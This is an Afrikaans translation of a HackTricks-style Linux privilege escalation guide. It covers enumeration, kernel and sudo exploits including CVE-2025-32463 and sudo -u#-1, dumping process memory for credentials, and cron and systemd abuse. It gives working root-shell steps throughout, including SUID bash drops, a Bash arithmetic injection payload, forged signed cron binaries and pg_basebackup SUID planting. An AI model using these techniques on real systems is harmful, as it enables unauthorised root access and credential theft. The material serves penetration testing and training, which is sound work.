# Linux Privilege Escalation

Vir breër agtergrond en historiese enumeration-werkvloeie, vergelyk die g0tmi1k-, Payatu-, SANS-, LPE Workshop-, Linux-Privilege-Escalation- en linux-private-i-hulpbronne wat in die verwysings gelys word.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Stelselinligting

### OS-inligting

Kom ons begin deur kennis op te doen oor die OS wat tans loop
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryftoestemmings op enige vouer binne die `PATH`**-veranderlike het, kan jy moontlik sommige libraries of binaries hijack:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Gaan die kernel-weergawe na en kyk of daar ’n exploit is wat gebruik kan word om privileges te eskaleer
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan ’n goeie lys van kwesbare kernels en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes van daardie webwerf te onttrek, kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer IN victim uit,slegs exploits vir kernel 2.x word nagegaan)

**Soek altyd die kernel-weergawe in Google**, moontlik is jou kernel-weergawe in een of ander kernel exploit geskryf, en dan sal jy seker wees dat hierdie exploit geldig is.

Bykomende kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat in verskyn:
```bash
searchsploit sudo
```
Jy kan met hierdie grep kyk of die sudo-weergawe kwesbaar is.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-weergawes voor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) laat onbevoorregte plaaslike gebruikers toe om hul privileges na root te eskaleer via sudo se `--chroot`-opsie wanneer die `/etc/nsswitch.conf`-lêer vanaf ’n gebruikerbeheerde gids gebruik word.<sup>[[28]](#references)[[29]](#references)</sup>

Hier is ’n [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) om daardie [kwesbaarheid](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) uit te buit. Maak seker dat jou `sudo`-weergawe kwesbaar is en dat dit die `chroot`-funksie ondersteun voordat jy die exploit uitvoer.

Vir meer inligting, verwys na die oorspronklike [kwesbaarheidadvies](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo voor 1.9.17p1 (gerapporteerde geaffekteerde reeks: **1.8.8–1.9.17**) kan host-based sudoers-reëls evalueer deur die **gebruiker-verskafde hostname** vanaf `sudo -h <host>` in plaas van die **werklike hostname** te gebruik. Indien sudoers breër privileges op ’n ander host toestaan, kan jy daardie host plaaslik **spoof**.<sup>[[29]](#references)</sup>

Vereistes:
- Kwesbare sudo-weergawe
- Host-spesifieke sudoers-reëls (host is nóg die huidige hostname nóg `ALL`)

Voorbeeld van ’n sudoers-patroon:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit deur die toegelate host te spoof:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Indien resolusie van die vervalste naam blokkeer, voeg dit by `/etc/hosts` of gebruik ’n gasheernaam wat reeds in logs/configs voorkom om DNS-opsoeke te vermy.

#### sudo < v1.8.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-handtekeningverifikasie het misluk

Kyk na **smasher2-box van HTB** vir ’n **voorbeeld** van hoe hierdie kwesbaarheid uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelselenumerasie
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumereer moontlike verdedigingmaatreëls

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

As jy binne ’n container is, begin met die volgende container-security-afdeling en pivot dan na die runtime-spesifieke abuse-bladsye:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Skywe

Kontroleer **wat gemount en unmount is**, waar en waarom. As enigiets unmount is, kan jy probeer om dit te mount en vir private inligting te kontroleer.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kyk ook of **enige compiler geïnstalleer is**. Dit is nuttig as jy ’n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit te compile op die masjien waar jy dit gaan gebruik (of op een soortgelyke masjien).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwesbare Sagteware Geïnstalleer

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar byvoorbeeld ’n ou Nagios-weergawe wat uitgebuit kan word om privileges te eskaleer…\
Dit word aanbeveel om die weergawe van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie opdragte baie inligting sal vertoon wat meestal nutteloos sal wees; daarom word sommige toepassings soos OpenVAS of soortgelyke nutsprogramme aanbeveel, wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort te hê** (miskien word tomcat deur root uitgevoer?)
```bash
ps aux
ps -ef
top -n 1
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop; jy kan dit misbruik om privileges te eskaleer](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** detecteer dit deur die `--inspect`-parameter binne die proses se command line na te gaan.\
Kontroleer ook **jou privileges oor die prosesse se binaries**; dalk kan jy iemand s’n oorskryf.

### Ouer-kind-kettings tussen gebruikers

’n Child process wat onder ’n **ander gebruiker** as sy parent loop, is nie outomaties kwaadwillig nie, maar dit is ’n nuttige **triage signal**. Sommige oorgange word verwag (`root` wat ’n service user begin, login managers wat session processes skep), maar ongewone kettings kan wrappers, debug helpers, persistence of swak runtime trust boundaries openbaar.

Vinnige oorsig:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
As jy ’n verrassende ketting vind, inspekteer die parent command line en alle lêers wat die gedrag daarvan beïnvloed (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). In verskeie werklike privesc-paaie was die child self nie writable nie, maar die **parent-controlled config** of helper chain was.

### Geskrapte uitvoerbare lêers en geskrapte-oop lêers

Runtime artifacts is dikwels steeds toeganklik **nadat dit geskrap is**. Dit is nuttig vir beide privilege escalation en die herwinning van bewyse uit ’n proses wat reeds sensitiewe lêers oop het.

Kyk vir geskrapte uitvoerbare lêers:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
As `/proc/<PID>/exe` na `(deleted)` wys, loop die proses steeds die ou binêre beeld vanuit die geheue. Dit is ’n sterk sein om te ondersoek omdat:

- die verwyderde uitvoerbare lêer interessante strings of credentials kan bevat
- die lopende proses steeds nuttige lêerbeskrywers kan blootstel
- ’n verwyderde bevoorregte binêre lêer op onlangse peutery of ’n poging tot opruiming kan dui

Versamel deleted-open files wêreldwyd:
```bash
lsof +L1
```
As jy ’n interessante descriptor vind, herwin dit direk:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Dit is veral waardevol wanneer ’n proses steeds ’n geskrapte secret, script, database export of flag file oop het.

### Prosesmonitering

Jy kan tools soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer ’n stel vereistes nagekom word.

### Prosesgeheue

Sommige dienste van ’n server stoor **credentials in clear text binne die geheue**.\
Normaalweg sal jy **root privileges** nodig hê om die geheue van prosesse te lees wat aan ander gebruikers behoort; daarom is dit gewoonlik nuttiger wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **jy as ’n gewone gebruiker die geheue van die prosesse wat jy besit, kan lees**.

> [!WARNING]
> Let daarop dat die meeste masjiene deesdae **nie ptrace by verstek toelaat nie**, wat beteken dat jy nie ander prosesse wat aan jou unprivileged user behoort, kan dump nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs ’n parent process kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE capability vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getrace word nie. Sodra dit gestel is, is ’n reboot nodig om ptracing weer te aktiveer.

#### GDB

As jy toegang tot die geheue van ’n FTP-diens het, kan jy byvoorbeeld die Heap kry en daarin na sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID wys **maps hoe geheue binne daardie proses se** virtuele adresruimte gekarteer is; dit wys ook die **toestemmings van elke gekarteerde streek**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Vanuit die **maps**-lêer weet ons watter **geheuestreke leesbaar** is en wat hul offsets is. Ons gebruik hierdie inligting om **in die mem-lêer te seek en alle leesbare streke** na 'n lêer te dump.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kern se virtuele adresruimte kan met /dev/kmem verkry word.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem**-groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir Linux

ProcDump is ’n Linux-herverbeelding van die klassieke ProcDump-nutsding uit die Sysinternals-suite van nutsmiddels vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om ’n process se memory te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan root requirements handmatig verwyder en die process wat aan jou behoort dump
- Script A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Credentials uit Process Memory

#### Handmatige voorbeeld

As jy vind dat die authenticator process loop:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die memory van ’n proses te dump) en binne die memory na credentials soek:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **clear text credentials uit memory steel** en uit sommige **bekende lêers**. Dit vereis root privileges om behoorlik te werk.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM-wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron-take

### Crontab UI (alseambusher) running as root – web-gebaseerde scheduler privesc

As ’n web-“Crontab UI”-paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gebind is, kan jy dit steeds via SSH local port-forwarding bereik en ’n bevoorregte taak skep om te eskaleer.<sup>[[1]](#references)[[4]](#references)</sup>

Tipiese ketting
- Ontdek die loopback-only-poort (bv. 127.0.0.1:8000) en Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind credentials in operasionele artefakte:
- Backups/scripts met `zip -P <password>`
- systemd unit wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` blootstel
- Skep tonnel en meld aan:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep ’n job met hoë privileges en voer dit onmiddellik uit (laat ’n SUID shell val):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Verharding
- Moenie Crontab UI as root uitvoer nie; beperk dit tot ’n toegewyde gebruiker met minimale toestemmings
- Bind aan localhost en beperk toegang addisioneel via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy die insluiting van secrets in unit files; gebruik secret stores of ’n EnvironmentFile wat slegs deur root leesbaar is
- Aktiveer ouditering/logging vir on-demand job-uitvoerings

Kontroleer of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit ’n script wat deur root uitgevoer word (wildcard vuln? Kan jy lêers wysig wat root gebruik? Gebruik symlinks? Skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Indien `run-parts` gebruik word, kyk watter name werklik uitgevoer sal word:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
This vermy vals positiewe. ’n Skryfbare periodieke gids is slegs nuttig as jou payload-lêernaam by die plaaslike `run-parts`-reëls pas.

### Cron path

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let daarop dat die gebruiker "user" skryftoestemmings oor /home/user het_)

As die root-gebruiker binne hierdie crontab probeer om ’n opdrag of script uit te voer sonder om die path te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy ’n root shell verkry deur:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” binne 'n command bevat, kan jy dit uitbuit om onverwagte dinge te laat gebeur (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard deur 'n pad soos** _**/some/path/\***_ **voorafgegaan word, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildcard exploitation-truuks:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) en let plaasvind. As 'n root cron/parser onvertroude log-velde lees en dit in 'n arithmetic context invoer, kan 'n aanvaller 'n command substitution $(...) inject wat as root uitgevoer word wanneer die cron loop.<sup>[[22]](#references)</sup>

- Waarom dit werk: In Bash vind expansions in hierdie volgorde plaas: parameter/variable expansion, command substitution, arithmetic expansion, en daarna word splitting en pathname expansion. Dus word 'n waarde soos `$(/bin/bash -c 'id > /tmp/pwn')0` eers gesubstitueer (waarmee die command uitgevoer word), waarna die oorblywende numeriese `0` vir die arithmetic gebruik word sodat die script sonder foute voortgaan.

- Tipiese kwesbare patroon:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Kry attacker-controlled teks in die geparsde log geskryf sodat die veld wat numeries lyk, 'n command substitution bevat en met 'n syfer eindig. Maak seker dat jou command niks na stdout uitvoer nie (of redirect dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Oorskryf van cron-script en symlink

As jy **'n cron-script kan wysig wat deur root uitgevoer word**, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word ’n **gids waartoe jy volle toegang het** gebruik, kan dit dalk nuttig wees om daardie vouer uit te vee en **’n symlink-vouer na ’n ander een te skep** wat ’n script bedien wat deur jou beheer word
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-validering en veiliger lêerhantering

Wanneer bevoorregte scripts/binaries nagegaan word wat lêers volgens ’n pad lees of skryf, verifieer hoe skakels hanteer word:

- `stat()` volg ’n symlink en gee metadata van die teiken terug.
- `lstat()` gee metadata van die skakel self terug.
- `readlink -f` en `namei -l` help om die finale teiken op te los en die toestemmings van elke padkomponent te wys.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Vir defenders/developers sluit veiliger patrone teen symlink-truuks die volgende in:

- `O_EXCL` met `O_CREAT`: misluk as die pad reeds bestaan (blokkeer voorafgeskepte links/lêers deur die aanvaller).
- `openat()`: werk relatief tot ’n vertroude directory file descriptor.
- `mkstemp()`: skep tydelike lêers atomies met veilige permissions.

### Custom-signed cron binaries with writable payloads
Blue teams "sign" soms cron-gedrewe binaries deur ’n custom ELF-section te dump en vir ’n vendor-string te grep voordat hulle dit as root uitvoer. As daardie binary group-writable is (bv. `/opt/AV/periodic-checks/monitor`, owned by `root:devs 770`) en jy die signing material kan leak, kan jy die section forge en die cron-task hijack:<sup>[[2]](#references)</sup>

1. Gebruik `pspy` om die verification flow vas te lê. In Era het root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` uitgevoer, gevolg deur `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, en daarna die file uitgevoer.
2. Recreate die verwagte certificate met die gelekte key/config (uit `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Bou ’n malicious replacement (bv. drop ’n SUID bash, voeg jou SSH key by) en embed die certificate in `.text_sig` sodat die grep slaag:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite die scheduled binary terwyl execute bits behoue bly:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wag vir die volgende cron-run; sodra die naïewe signature-check slaag, loop jou payload as root.

### Frequent cron jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit benut en privileges escalate.

Byvoorbeeld, om **elke 0.1s gedurende 1 minuut te monitor**, volgens **die minste uitgevoerde commands te sorteer** en die commands wat die meeste uitgevoer is te delete, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook** [**pspy**](https://github.com/DominicBreuker/pspy/releases) gebruik (dit sal elke proses wat begin monitor en lys).

### Root-rugsteune wat aanvaller-gestelde modus-bits behou (pg_basebackup)

As ’n root-owned cron `pg_basebackup` (of enige recursive copy) uitvoer teen ’n databasisgids waarna jy kan skryf, kan jy ’n **SUID/SGID binary** plant wat as **root:root** met dieselfde modus-bits na die backup-uitset herkopieer sal word.<sup>[[26]](#references)</sup>

Tipiese ontdekkingsvloei (as ’n low-priv DB user):
- Gebruik `pspy` om ’n root cron raak te sien wat iets soos `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` elke minuut uitvoer.
- Bevestig dat die source cluster (bv. `/var/lib/postgresql/14/main`) deur jou beskryfbaar is en dat die destination (`/opt/backups/current`) ná die taak deur root besit word.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dit werk omdat `pg_basebackup` lêermodusbisse behou wanneer dit die cluster kopieer; wanneer dit deur root uitgevoer word, erf die bestemmingslêers **root-eienaarskap + aanvallergekose SUID/SGID**. Enige soortgelyke bevoorregte backup-/kopieerroetine wat toestemmings behou en na ’n uitvoerbare ligging skryf, is kwesbaar.

### Onsigbare cron jobs

Dit is moontlik om ’n cronjob te skep deur **’n carriage return ná ’n opmerking te plaas** (sonder ’n newline-karakter), en die cron job sal werk. Voorbeeld (let op die carriage return-karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Om hierdie soort stealth entry op te spoor, inspekteer cron-lêers met tools wat beheerkarakters blootstel:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Dienste

### Skryfbare _.service_ -lêers

Kontroleer of jy na enige `.service`-lêer kan skryf; indien wel, **kan jy dit wysig** sodat dit jou **backdoor uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (jy sal dalk moet wag totdat die masjien herlaai word).\
Byvoorbeeld, skep jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diensbinaries

Hou in gedagte dat indien jy **skryftoestemmings het oor binaries wat deur dienste uitgevoer word**, jy dit vir backdoors kan verander sodat die backdoors uitgevoer word wanneer die dienste weer uitgevoer word.

### systemd PATH - Relative Paths

Jy kan die PATH wat deur **systemd** gebruik word, sien met:
```bash
systemctl show-environment
```
As jy vind dat jy in enige van die vouers van die pad kan **skryf**, kan jy moontlik **voorregte eskaleer**. Jy moet soek na **relatiewe paaie wat in dienskonfigurasie**-lêers gebruik word, soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dan, skep ’n **executable** met dieselfde naam as die relatiewe pad-binêre binne die systemd PATH-lêergids waarin jy kan skryf, en wanneer die diens versoek word om die kwesbare aksie (**Start**, **Stop**, **Reload**) uit te voer, sal jou **backdoor uitgevoer word** (onbevoorregte gebruikers kan gewoonlik nie dienste start/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-unit-lêers waarvan die naam met **.timer** eindig en wat **.service**-lêers of gebeurtenisse beheer. **Timers** kan as ’n alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning vir kalender-tydgebeurtenisse en monotone tydgebeurtenisse het en asynchroon uitgevoer kan word.

Jy kan al die timers met die volgende opnoem:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit sekere systemd.unit-eenhede (soos 'n `.service` of 'n `.target`) laat uitvoer.
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

